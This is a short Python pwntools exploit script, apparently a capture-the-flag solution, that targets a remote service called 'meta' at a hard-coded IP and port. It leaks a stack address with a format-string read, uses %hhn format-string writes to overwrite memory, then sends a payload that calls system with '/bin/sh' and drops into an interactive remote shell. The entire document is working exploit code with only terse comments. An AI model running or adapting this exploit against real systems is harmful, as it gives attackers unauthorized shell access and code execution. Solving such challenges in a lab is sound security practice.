from pwn import *

# r = process("./meta")
r = remote("159.203.38.169", 5685)

r.sendlineafter("meta?\n", "%138$x")
r.recvuntil("Your answer was: \n")
stack = int(r.recv(8), 16)
n = stack + 0x218
log.info("stack : " + hex(stack))
r.sendlineafter("meta?\n", p32(stack + 0x219) + "%130c%6$hhn")	# overwrite n
r.sendlineafter("meta?\n", "AAAA%138$n")	# stage1
r.sendlineafter("data?\n>", p32(stack + 0x210) + "%152c%6$hhn")
payload = p32(0x080483E0)	# system
payload += p32(0x41414141)
payload += p32(stack + 16)	# /bin/sh
payload += "/bin/sh;"
payload += 'A' * 0x200 + "BBBB" + p32(stack + 8)
r.sendlineafter("quiz?\n>", payload)
r.interactive()
